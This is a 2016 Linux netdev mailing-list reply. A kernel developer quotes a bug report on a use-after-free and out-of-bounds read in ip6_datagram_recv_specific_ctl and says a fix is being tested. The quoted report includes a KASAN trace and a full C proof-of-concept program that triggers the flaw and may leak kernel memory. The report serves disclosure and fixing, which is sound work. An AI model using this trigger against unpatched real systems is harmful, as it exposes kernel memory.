From: Eric Dumazet <eric.dumazet@gmail.com>
Subject: Re: BUG: net/ipv6: kernel memory leak in
 ip6_datagram_recv_specific_ctl
Date: Wed, 12 Oct 2016 17:05:43 +0200
Message-ID: <1476284743.5650.1.camel@edumazet-glaptop3.roam.corp.google.com>
References: <21019976-9e40-5e6d-b733-fa9eced710f0@gmail.com>
Mime-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 7bit
Cc: netdev@vger.kernel.org
To: Baozeng Ding <sploving1@gmail.com>
Return-path: <netdev-owner@vger.kernel.org>
Received: from mail-pf0-f176.google.com ([209.85.192.176]:34820 "EHLO
        mail-pf0-f176.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
        with ESMTP id S933747AbcJLPFu (ORCPT
        <rfc822;netdev@vger.kernel.org>); Wed, 12 Oct 2016 11:05:50 -0400
Received: by mail-pf0-f176.google.com with SMTP id s8so19810814pfj.2
        for <netdev@vger.kernel.org>; Wed, 12 Oct 2016 08:05:50 -0700 (PDT)
In-Reply-To: <21019976-9e40-5e6d-b733-fa9eced710f0@gmail.com>
Sender: netdev-owner@vger.kernel.org
List-ID: <netdev.vger.kernel.org>

On Wed, 2016-10-12 at 19:09 +0800, Baozeng Ding wrote:
> Hi all,
> The following program triggers use-after-free in ip6_datagram_recv_specific_ctl, which may leak kernel memory. The
> kernel version is 4.8.0+ (on Oct 7 commit d1f5323370fceaed43a7ee38f4c7bfc7e70f28d0).
> ==========================================================
> BUG: KASAN: use-after-free in ip6_datagram_recv_specific_ctl+0x13f1/0x15c0 at addr ffff880029c84ec8
> Read of size 1 by task poc/25548
> Call Trace:
>  [<ffffffff82cf43c9>] dump_stack+0x12e/0x185 /lib/dump_stack.c:15
>  [<     inline     >] print_address_description /mm/kasan/report.c:204
>  [<ffffffff817ced3b>] kasan_report_error+0x48b/0x4b0 /mm/kasan/report.c:283
>  [<     inline     >] kasan_report /mm/kasan/report.c:303
>  [<ffffffff817ced9e>] __asan_report_load1_noabort+0x3e/0x40 /mm/kasan/report.c:321
>  [<ffffffff85c71da1>] ip6_datagram_recv_specific_ctl+0x13f1/0x15c0 /net/ipv6/datagram.c:687
>  [<ffffffff85c734c3>] ip6_datagram_recv_ctl+0x33/0x40
>  [<ffffffff85c0b07c>] do_ipv6_getsockopt.isra.4+0xaec/0x2150
>  [<ffffffff85c0c7f6>] ipv6_getsockopt+0x116/0x230
>  [<ffffffff859b5a12>] tcp_getsockopt+0x82/0xd0 /net/ipv4/tcp.c:3035
>  [<ffffffff855fb385>] sock_common_getsockopt+0x95/0xd0 /net/core/sock.c:2647
>  [<     inline     >] SYSC_getsockopt /net/socket.c:1776
>  [<ffffffff855f8ba2>] SyS_getsockopt+0x142/0x230 /net/socket.c:1758
>  [<ffffffff8685cdc5>] entry_SYSCALL_64_fastpath+0x23/0xc6
> Memory state around the buggy address:
>  ffff880029c84d80: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
>  ffff880029c84e00: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
> > ffff880029c84e80: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
>                                               ^
>  ffff880029c84f00: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
>  ffff880029c84f80: ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff ff
> 
> 
> ==========================================================
> #include <unistd.h>
> #include <stdint.h>
> #include <sys/socket.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <sys/syscall.h>
> #include <linux/in.h>
> #include <linux/in6.h>
> #include <errno.h>
> 
> #define IPV6_2292DSTOPTS        4
> #define IPV6_2292PKTOPTIONS     6
> #define IPV6_FLOWINFO           11
> 
> 
> int main()
> {
>   int fd;
>   int i, r;
>   int opt = 1, len = 0;
>   struct msghdr msg;
>   struct sockaddr_in6 addr;
>   int sub_addr[4];
>   struct iovec iov;
>   memset(sub_addr, 0, sizeof(sub_addr));
>   sub_addr[3] = 0x1000000;
>   memcpy(&addr.sin6_addr, sub_addr, sizeof(sub_addr));
>   addr.sin6_family = AF_INET6;
>   addr.sin6_port = 0x10ab;
>   addr.sin6_flowinfo = 0x1;
>   addr.sin6_scope_id = 0;
> 
>   mmap(0x20000000ul, 0x1c000ul, 0x3ul, 0x32ul, -1, 0x0ul, 0, 0, 0);
>   memset(0x20000000, 'a', 0x1c000);
>   fd = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
>   bind(fd, &addr, sizeof(addr));
> 
>   setsockopt(fd, IPPROTO_IPV6, IPV6_2292DSTOPTS, &opt, 4);
>   setsockopt(fd, IPPROTO_IPV6, IPV6_FLOWINFO, &opt, 4);
> 
>   addr.sin6_flowinfo = 0;
>   addr.sin6_scope_id = 0;
>   msg.msg_name = &addr;
>   msg.msg_namelen = sizeof(addr);
>   msg.msg_iov = &iov;
>   msg.msg_iovlen = 1;
>   msg.msg_iov->iov_base = 0x20000000;
>   msg.msg_iov->iov_len = 0x100;
>   msg.msg_control = 0x20000000;
>   msg.msg_controllen = 0x100;
>   msg.msg_flags = 0;
>   r = sendmsg(fd, &msg, MSG_FASTOPEN);
>   if (r < 0) {
>       printf("sendmsg errno=%d\n", r);
>   }
> 
>   r = getsockopt(fd, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0x20012000ul, &len);
>   if (r < 0) printf("getsockopt error\n");
>   return 0;
> }
> 
> The following lines case out-of-bounds read, which may leak kernel memory by put_cmsg.
> 686   u8 *ptr = nh + opt->dst0; // Out-of-bouds when opt->dst0 is large.
> 687   put_cmsg(msg, SOL_IPV6, IPV6_2292DSTOPTS, (ptr[1]+1)<<3, ptr);
> 
> I debuged using printk and  got some values of opt as the following, which may help locate the root cause of the bug. Thanks.
> 
> [85564.842733] degug: opt->iif is 0xe111121c
> [85564.842737] degug: opt->ra is 0x121c
> [85564.842741] degug: opt->dst0 is 0xe111
> 
> Best Regards,
> Baozeng Ding

Thanks for the report.

I am testing a patch to fix this issue.
